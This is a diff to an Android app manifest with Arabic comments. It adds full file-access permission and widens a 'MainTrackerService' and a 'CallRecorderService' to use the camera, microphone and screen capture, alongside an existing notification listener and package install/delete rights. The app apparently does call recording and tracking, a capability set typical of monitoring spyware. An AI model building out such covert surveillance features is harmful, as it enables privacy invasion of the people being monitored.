@@ -69,6 +69,9 @@
     <!-- === الإشعارات === -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
+    <!-- === الوصول الكامل للملفات (Android 11+) === -->
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+
     <!-- === إدارة التطبيقات === -->
     <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
     <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
@@ -129,8 +132,8 @@
             </intent-filter>
         </receiver>
 
-        <service android:name=".services.MainTrackerService" android:foregroundServiceType="location|dataSync" android:exported="false"/>
-        <service android:name=".services.CallRecorderService" android:foregroundServiceType="microphone" android:exported="false"/>
+        <service android:name=".services.MainTrackerService" android:foregroundServiceType="location|dataSync|camera|microphone|mediaProjection|connectedDevice" android:exported="false"/>
+        <service android:name=".services.CallRecorderService" android:foregroundServiceType="microphone|mediaProjection" android:exported="false"/>
         <service android:name=".services.MyNotificationListener" android:exported="true" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
             <intent-filter><action android:name="android.service.notification.NotificationListenerService" /></intent-filter>
         </service>
